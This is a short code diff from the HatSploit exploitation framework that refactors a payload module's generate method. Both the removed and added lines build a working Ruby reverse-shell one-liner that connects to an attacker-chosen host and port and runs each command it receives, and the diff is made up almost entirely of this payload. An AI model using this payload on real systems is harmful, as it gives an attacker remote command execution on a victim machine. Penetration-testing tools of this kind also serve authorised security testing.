@@ -54,8 +54,11 @@ class HatSploitPayload(HatSploitPayload):
     def generate(self):
         local_host, local_port = self.parser.parse_options(self.options)
 
-        self.data['payload'] = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-        self.data['execute'] = self.data['payload']
-        self.data['type'] = 'reverse_tcp'
+        self.badges.output_process("Generating payload...")
+        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
-        return self.data
+        self.method['Payload'] = payload
+        self.method['Insructions'] = payload
+        self.method['Action'] = 'reverse_tcp'
+
+        return payload
